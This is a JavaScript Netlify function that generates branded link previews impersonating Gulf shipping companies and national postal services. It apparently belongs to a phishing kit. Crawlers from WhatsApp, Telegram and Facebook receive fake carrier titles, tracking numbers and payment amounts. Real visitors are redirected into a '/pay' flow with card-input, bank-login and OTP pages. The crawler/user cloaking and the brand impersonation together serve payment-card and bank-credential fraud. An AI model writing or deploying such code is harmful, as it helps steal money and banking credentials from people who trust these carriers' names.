// Service data mapping - matches the serviceLogos.ts file
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL",
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlkw: {
    name: "دي إتش إل - DHL الكويت",
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlqa: {
    name: "دي إتش إل - DHL قطر",
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlom: {
    name: "دي إتش إل - DHL عُمان",
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlbh: {
    name: "دي إتش إل - DHL البحرين",
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات",
    ogImage: "/og-fedex.jpg"
  },
  ups: {
    name: "يو بي إس - UPS",
    description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
    ogImage: "/og-ups.jpg"
  },
  empost: {
    name: "البريد الإماراتي - Emirates Post",
    description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
    ogImage: "/og-empost.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
    ogImage: "/og-smsa.jpg"
  },
  zajil: {
    name: "زاجل - Zajil",
    description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
    ogImage: "/og-zajil.jpg"
  },
  naqel: {
    name: "ناقل - Naqel",
    description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
    ogImage: "/og-naqel.jpg"
  },
  saudipost: {
    name: "البريد السعودي - Saudi Post",
    description: "المشغل الوطني للبريد في المملكة العربية السعودية",
    ogImage: "/og-saudipost.jpg"
  },
  kwpost: {
    name: "البريد الكويتي - Kuwait Post",
    description: "المشغل الوطني للبريد في دولة الكويت",
    ogImage: "/og-kwpost.jpg"
  },
  qpost: {
    name: "البريد القطري - Qatar Post",
    description: "المشغل الوطني للبريد في دولة قطر",
    ogImage: "/og-qpost.jpg"
  },
  omanpost: {
    name: "البريد العُماني - Oman Post",
    description: "المشغل الوطني للبريد في سلطنة عُمان",
    ogImage: "/og-omanpost.jpg"
  },
  bahpost: {
    name: "البريد البحريني - Bahrain Post",
    description: "المشغل الوطني للبريد في مملكة البحرين",
    ogImage: "/og-bahpost.jpg"
  }
};

// Country data mapping
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

// Supabase configuration
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;

const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;

// Function to get link data from database
async function getLinkData(linkId) {
  if (!supabase) {
    console.log('Supabase not configured, using fallback data');
    return null;
  }

  try {
    const { data, error } = await supabase
      .from('links')
      .select('*')
      .eq('id', linkId)
      .single();

    if (error) {
      console.error('Error fetching link data:', error);
      return null;
    }

    return data;
  } catch (error) {
    console.error('Error in getLinkData:', error);
    return null;
  }
}

exports.handler = async (event, context) => {
  try {
    // Initialize all variables with safe defaults
    let title = "منصة الشحن الذكية";
    let description = "نظام دفع آمن ومحمي";
    let ogImage = "/og-aramex.jpg";
    let serviceKey = 'aramex';
    let serviceName = 'خدمة الشحن';
    let metaSiteName = 'منصة الشحن الذكية';
    let originalPath = '/';
    let countryCode = 'SA';
    let type = 'shipping';
    let id = 'unknown';

    // Get query parameters
    const queryStringParameters = event.queryStringParameters || {};

    // Determine the original path from multiple sources
    // Priority: 1) query params (from redirects), 2) event.path, 3) event.rawPath
    if (queryStringParameters.path) {
      originalPath = queryStringParameters.path;
    } else if (event.path) {
      originalPath = event.path;
    } else if (event.rawPath) {
      originalPath = event.rawPath;
    }

    // Remove function prefix if accidentally included
    originalPath = originalPath.replace('/.netlify/functions/microsite-meta', '');

    // Ensure path starts with /
    if (!originalPath.startsWith('/')) {
      originalPath = '/' + originalPath;
    }

    // Remove trailing slash for consistency
    originalPath = originalPath.replace(/\/$/, '') || '/';

    const queryParams = queryStringParameters;

    // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
    let pathMatch = originalPath.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);

    if (pathMatch) {
      [, countryCode, type, id] = pathMatch;
    } else {
      // Handle payment page routes: /pay/:id/...
      pathMatch = originalPath.match(/^\/pay\/([a-zA-Z0-9-]+)(?:\/(.+))?$/);
      if (pathMatch) {
        [, id, subPath] = pathMatch;
        type = 'shipping'; // Default to shipping for payment pages
        countryCode = 'SA'; // Default country, will be overridden by link data
      } else {
        // If no match, return a default payment page
        title = "الدفع الآمن";
        description = "صفحة دفع آمنة ومحمية";
        ogImage = "/og-aramex.jpg";
        serviceName = "منصة الشحن الذكية";
        metaSiteName = "منصة الشحن الذكية";
      }
    }

    // Get site URL from headers
    const host = event.headers?.host || event.headers?.['host'] || event.headers?.['Host'] || 'dynamic-sunflower-49efe2.netlify.app';
    const protocol = event.headers?.['x-forwarded-proto'] || event.headers?.['X-Forwarded-Proto'] || 'https';
    const siteUrl = `${protocol}://${host}`;

    // Detect if this is a bot request (for social media sharing)
    const ua = event.headers['user-agent'] || event.headers['User-Agent'] || '';
    const isBot = /bot|facebookexternalhit|twitterbot|WhatsApp|Telegram|preview|crawler|spider|crawl/i.test(ua);

    // If this is a real user (not a bot), redirect directly to the payment page
    if (!isBot && id !== 'unknown') {
      // Get service data for the redirect URL
      const linkData = await getLinkData(id);

      if (linkData?.type) {
        type = linkData.type;
      }

      if (type === "shipping") {
        // Determine service key
        if (linkData?.payload?.service_key) {
          serviceKey = linkData.payload.service_key;
        } else if (linkData?.payload?.service) {
          serviceKey = linkData.payload.service;
        } else if (queryParams?.service) {
          serviceKey = queryParams.service;
        }

        const normalizedKey = (serviceKey || '').toLowerCase().replace(/[^a-z0-9]/g, '');
        const baseKey = normalizedKey.replace(/(kw|qa|om|bh|ae|sa)$/, '') || normalizedKey;
        let serviceInfo = serviceData[normalizedKey] || serviceData[baseKey] || serviceData.aramex;
        serviceName = linkData?.payload?.service_name || serviceInfo?.name || 'shipping';
      }

      // Redirect to receiver info page
      const redirectUrl = `${siteUrl}/pay/${id}/recipient`;

      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-cache, no-store, must-revalidate'
        },
        body: `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="refresh" content="0; url=${redirectUrl}" />
  <script>
    window.location.href = '${redirectUrl}';
  </script>
</head>
<body></body>
</html>`
      };
    }

    // Only continue processing for bot requests (social media crawlers)
    if (id !== 'unknown') {
      const country = countryData[countryCode];

      // Try to get link data from database first
      const linkData = await getLinkData(id);

      // For payment pages, get country and type from link data if available
      if (linkData?.country_code) {
        countryCode = linkData.country_code;
        const linkCountry = countryData[countryCode];
        if (linkCountry) {
          // Update country info
        }
      }

      if (linkData?.type) {
        type = linkData.type;
      }

      if (type === "shipping") {
        // Determine service key from multiple sources
        if (linkData?.payload?.service_key) {
          serviceKey = linkData.payload.service_key;
        } else if (linkData?.payload?.service) {
          serviceKey = linkData.payload.service;
        } else if (queryParams?.service) {
          serviceKey = queryParams.service;
        }

        // Normalize service key (handle variations like dhlkw, dhlqa, etc.)
        const normalizedKey = (serviceKey || '').toLowerCase().replace(/[^a-z0-9]/g, '');
        const baseKey = normalizedKey.replace(/(kw|qa|om|bh|ae|sa)$/, '') || normalizedKey;

        // Get service info - try exact match first, then base key, then fallback
        let serviceInfo = serviceData[normalizedKey] || serviceData[baseKey] || serviceData.aramex;

        // Ensure we have valid service info
        if (!serviceInfo || !serviceInfo.description) {
          serviceInfo = serviceData.aramex;
        }

        // Get service name - ALWAYS DEFINED
        serviceName = linkData?.payload?.service_name || serviceInfo?.name || 'خدمة الشحن';
        metaSiteName = serviceName;

        // Determine if this is a payment page or microsite
        const isPaymentPage = originalPath.startsWith('/pay/');
        let pageType = '';

        // Determine specific payment page type
        if (isPaymentPage) {
          if (originalPath.includes('/recipient')) {
            pageType = 'معلومات المستلم';
          } else if (originalPath.includes('/details')) {
            pageType = 'تفاصيل الدفع';
          } else if (originalPath.includes('/card-input')) {
            pageType = 'بيانات البطاقة';
          } else if (originalPath.includes('/bank-login')) {
            pageType = 'تسجيل الدخول';
          } else if (originalPath.includes('/otp')) {
            pageType = 'رمز التحقق';
          } else {
            pageType = 'صفحة دفع آمنة';
          }
        } else {
          pageType = 'تتبع وتأكيد الدفع';
        }

        // Use company description as primary description
        title = `${serviceName} - ${pageType}`;
        // Use company description prominently - this is what appears when sharing links
        description = serviceInfo?.description || `صفحة دفع آمنة لخدمة ${serviceName}`;

        // Add additional context only if needed (keep description concise for sharing)
        if (!isPaymentPage) {
          description += ` - تتبع شحنتك وأكمل الدفع بشكل آمن`;
        }

        // Add tracking number to description if available
        if (linkData?.payload?.tracking_number) {
          description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
        }

        // Add COD amount if available
        if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
          description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
        }

        ogImage = serviceInfo?.ogImage || "/og-aramex.jpg";
      } else if (type === "chalet") {
        const chaletName = linkData?.payload?.chalet_name || 'شاليه';
        const isPaymentPage = originalPath.startsWith('/pay/');
        const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';

        title = `${pageType} - ${chaletName}`;
        description = `احجز ${chaletName} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
        metaSiteName = chaletName;
        serviceName = chaletName; // Set serviceName for chalets too

        // Add guest count and nights if available
        if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
          description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
        }

        ogImage = "/og-aramex.jpg"; // Default for chalets
      }
    }

    // Build full URL (exclude 'path' from query params as it's internal)
    const queryString = Object.entries(queryParams)
      .filter(([k]) => k !== 'path')
      .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
      .join('&');
    const fullUrl = `${siteUrl}${originalPath}${queryString ? '?' + queryString : ''}`;

    // Ensure ogImage is absolute URL
    let fullOgImage = ogImage;
    if (!fullOgImage.startsWith('http')) {
      fullOgImage = `${siteUrl}${fullOgImage.startsWith('/') ? '' : '/'}${fullOgImage}`;
    }

    // Generate HTML with proper meta tags for bots
    const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#0EA5E9" />

  <!-- Basic Meta Tags -->
  <title>${title}</title>
  <meta name="description" content="${description}" />
  <meta name="author" content="منصة الشحن الذكية" />

  <!-- Open Graph / Facebook / WhatsApp -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="${fullUrl}" />
  <meta property="og:title" content="${title}" />
  <meta property="og:description" content="${description}" />
  <meta property="og:image" content="${fullOgImage}" />
  <meta property="og:image:secure_url" content="${fullOgImage}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:image:alt" content="${title}" />
  <meta property="og:site_name" content="${metaSiteName}" />
  <meta property="og:locale" content="ar_AR" />
  <meta property="og:locale:alternate" content="en_US" />

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:url" content="${fullUrl}" />
  <meta name="twitter:title" content="${title}" />
  <meta name="twitter:description" content="${description}" />
  <meta name="twitter:image" content="${fullOgImage}" />
  <meta name="twitter:image:alt" content="${title}" />

  <!-- Additional SEO -->
  <meta name="robots" content="index, follow" />
  <meta name="language" content="Arabic" />
  <link rel="canonical" href="${fullUrl}" />

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Almarai', sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #0EA5E9, #06B6D4);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .loading {
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .meta-info {
      background: rgba(255, 255, 255, 0.1);
      padding: 20px;
      border-radius: 10px;
      margin: 20px;
      backdrop-filter: blur(10px);
    }
  </style>
</head>
<body>
  <div class="loading">
    <div class="meta-info">
      <h1 style="font-size: 2rem; margin-bottom: 1rem;">${title}</h1>
      <p style="font-size: 1.2rem; margin-bottom: 1rem;">${description}</p>
      <p style="font-size: 0.9rem; opacity: 0.8;">جاري التحميل...</p>
    </div>
  </div>

  <script>
    // For bots: they read meta tags from this HTML before JS executes
    // For users: redirect to actual React app after a short delay to allow meta tags to be read
    setTimeout(function() {
      window.location.href = '${fullUrl}';
    }, 100);
  </script>
</body>
</html>`;

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'X-Robots-Tag': 'noindex, nofollow'
      },
      body: html
    };
  } catch (error) {
    console.error('Function error:', error);

    // Return a safe fallback HTML page on any error
    const fallbackHtml = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>منصة الشحن الذكية</title>
  <meta name="description" content="نظام دفع آمن ومحمي" />
</head>
<body>
  <h1>منصة الشحن الذكية</h1>
  <p>نظام دفع آمن ومحمي</p>
</body>
</html>`;

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate'
      },
      body: fallbackHtml
    };
  }
};
